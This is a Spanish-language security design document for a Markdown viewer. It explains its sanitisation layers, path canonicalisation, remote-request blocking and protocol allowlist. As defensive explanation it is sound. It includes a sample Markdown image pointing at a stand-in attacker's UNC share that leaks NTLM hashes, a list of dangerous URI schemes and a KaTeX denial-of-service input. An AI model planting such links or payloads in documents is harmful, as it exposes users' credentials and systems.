# La frontera de seguridad

Visor MD se fija como programa predeterminado para `.md`, así que abre
archivos que llegan por correo, por descarga o de un conversor automático. El
supuesto de partida es que **todo el contenido de un archivo Markdown es
hostil hasta que se demuestre lo contrario**, y eso incluye tanto un `.md`
escrito por un atacante como uno mal formado por una conversión PDF→Markdown.

Este documento describe dónde está cada frontera y por qué. La suite que lo
respalda es `tests/seguridad.py`, con su corpus en `tests/security/`.

## Las capas

```
Contenido del documento
  └─ markdown-it          html:true, el documento puede escribir HTML
      └─ DOMPurify        allowlist de etiquetas, atributos y protocolos
          └─ DOM          contenido dentro de #preview, con contain: paint
              └─ CSP      segunda barrera del navegador
                  └─ JavaScript de la aplicación
                      └─ puente de pywebview
                          └─ Python
                              └─ Windows y disco
```

La pregunta que ordena el diseño no es "¿puede ejecutar JavaScript?" sino
**"¿puede el documento alcanzar una capacidad que el usuario no le dio?"**.

## Lo que el documento no alcanza

Sin ejecución de JavaScript, `window.pywebview.api` es inalcanzable desde el
documento. No hay camino a procesos, órdenes del sistema, portapapeles,
registro de Windows ni configuración. La cadena `Markdown → HTML → DOM` está
cerrada por DOMPurify, y la CSP la respalda por debajo.

## Lo que sí alcanza, y cómo se acota

Hay una API que la propia aplicación invoca en nombre del documento, con un
argumento que el documento controla por completo: `image_data`, para mostrar
las imágenes locales. Ahí estaba el agujero real.

### Rutas: `safe_media_path`

Todo lo que el documento pide como ruta pasa por `safe_media_path` en
`src/main.py`. La comprobación se hace sobre la ruta **canónica**, no sobre el
texto: `resolve()` deshace `..`, nombres cortos 8.3, enlaces simbólicos y
puntos de reanálisis, de modo que lo validado es el archivo que realmente se
va a abrir. Validar la cadena original sería inútil frente a un junction.

Se rechaza siempre, sin excepción ni permiso que lo levante:

- rutas UNC (`\\servidor\recurso`) y unidades asignadas a red;
- rutas de dispositivo (`\\?\`, `\\.\`), que saltean la normalización de Windows;
- flujos alternativos de NTFS (`imagen.png:oculto`).

El motivo del primer punto es concreto: Windows negocia autenticación al
resolver una ruta UNC. Un `![x](\\atacante\s\a.png)` en un documento entrega
el hash NTLMv2 del usuario **al abrirlo**, sin JavaScript y sin un clic. Es el
ataque más barato contra un visor de documentos y no necesita ninguna
vulnerabilidad de memoria.

Además, por defecto, una imagen debe quedar dentro de la carpeta del
documento o por debajo. Fuera de ahí se bloquea con aviso y se carga con un
clic, igual que una imagen remota: un solo mecanismo de consentimiento para
todo lo que no vino con el documento.

Los enlaces a otros documentos usan el mismo guardián pero solo en su parte de
red, porque abrir el archivo que el usuario pidió es la función del programa.
La distinción está en quién propone la ruta: `open_into` recibe
`from_document`, y solo filtra cuando la ruta la puso el documento y no el
usuario.

## Peticiones a la red

**Abrir un documento no genera ni una petición remota.** Una imagen remota es
un rastreador aunque no ejecute nada: confirma que se abrió el archivo y
entrega IP, fecha y agente de usuario.

Lo que hay que entender de esta parte es que **el navegador pide los recursos
en cuanto el HTML entra al DOM**. Quitarlos después no sirve. Por eso hay dos
tiempos:

1. **Antes de insertar**: DOMPurify descarta `video`, `audio`, `source`,
   `track`, las imágenes de un SVG en línea, `srcset`, `ping` y `poster`.
   Ninguno aporta nada al formato Markdown y todos salen a la red solos.
2. **En el mismo bloque de código que la inserción**, sin esperar a nada:
   `stripStyleUrls` quita `url(...)` de los atributos `style`, y
   `resolveImages` desactiva los `src` remotos. Si se hiciera en un `setTimeout`
   o tras un `await`, la petición ya habría salido.

La CSP cierra lo que la sanitización no mira, como un `@import` dentro del
`<style>` que genera Mermaid.

## Protocolos

Allowlist explícita: `http`, `https`, `mailto` y rutas relativas. Se declara en
`render.js` en vez de usar la de DOMPurify, que además acepta `tel:`, `sms:`,
`cid:`, `xmpp:` y `ftp:`, que esta aplicación no usa.

Al hacer clic, un segundo filtro en `app.js` manda a `open_external` solo
http/https/mailto; el resto queda inerte por `preventDefault()`, y `auxclick`
cubre el clic central. Quedan fuera `javascript:`, `vbscript:`, `data:`,
`file:`, `ms-msdt:`, `ms-officecmd:`, `shell:` y `search-ms:`, en cualquier
combinación de mayúsculas, entidades HTML o codificación por ciento: la
comprobación se hace sobre el atributo ya normalizado por el analizador, no
sobre el texto original.

## Mermaid y KaTeX: dos parsers más

Ambos reciben contenido del documento y producen DOM, así que son fronteras
por derecho propio.

**Mermaid** corre con `securityLevel: 'strict'` y su SVG pasa por una segunda
sanitización antes de entrar al DOM. Esa segunda pasada existe porque
`block.innerHTML = svg` era la única vía por la que algo derivado del
documento llegaba al DOM sin atravesar `clean()`. Conserva el `<style>` que
Mermaid acota con el id del diagrama —sin él los diagramas pierden el color— y
descarta `foreignObject`, que es la puerta de vuelta a HTML dentro de un SVG.

**KaTeX** corre con `trust: false`, su valor por defecto, que desactiva
`\href`, `\url` y `\includegraphics`. Se le añaden `maxSize: 50` y
`maxExpand: 1000`: sin techo, un `\rule{99999em}{99999em}` deja la página
inutilizable.

## Suplantación de la interfaz

El documento se renderiza en la misma página que la interfaz, así que un `id`
repetido puede robarle una referencia a la aplicación. `#preview` está antes
que `#menu`, `#dialog` y `#ctxmenu` en el orden del árbol, y
`getElementById` devuelve el primero.

No hace falta un atacante: un encabezado `## Menú` produce `id="menu"` a
través del generador de anclas. La aplicación toma una instantánea de sus
elementos al cargar, con el documento todavía vacío, y resuelve siempre contra
ella.

Aparte, `#preview` lleva `contain: paint`, que contiene `position: fixed` y
`z-index`: el documento no puede cubrir la barra de herramientas. Y
`unhideCode` quita `style` y `hidden` dentro de los bloques de código, para
que lo que se copia sea lo que se lee.

## Frontmatter

No hay ningún analizador de YAML. `stripFrontMatter` es una expresión regular
que borra el bloque inicial. Sin parser no hay anchors que expandir,
etiquetas de deserialización que interpretar ni contaminación de prototipo
posible. Es una defensa por ausencia, y es la más sólida de todas.

## Configuración avanzada

Las restricciones son el valor por defecto, no una imposición. Desde el menú
`···` se puede aflojar la contención de imágenes, el bloqueo de las remotas,
el tope de diagramas, y marcar carpetas de confianza cuyos documentos se
tratan sin restricciones.

**No es configurable la sanitización, ni la CSP, ni la allowlist de
protocolos.** La línea es deliberada: se puede ampliar **a qué recursos accede
un documento**, nunca **qué puede ejecutar**. Un interruptor de esto último
sería el ajuste más atacado del programa, porque bastaría con convencer al
usuario de activarlo una sola vez, y ningún trabajo legítimo con un visor de
Markdown lo necesita.

## Lo que queda fuera

- **Un escape del sandbox de Chromium**: fuera del modelo de amenaza.
- **TOCTOU**: entre canonizar la ruta y leerla hay una ventana teórica,
  aprovechable solo por alguien que ya ejecuta código en la máquina, momento en
  el que no necesita este programa.
- **Agotar memoria** con un documento gigantesco. No se pone límite al tamaño:
  un `.md` de 30 MB es raro pero legítimo, y negarse a abrirlo rompería el
  propósito del programa. El usuario cierra la pestaña; no se pierde nada.
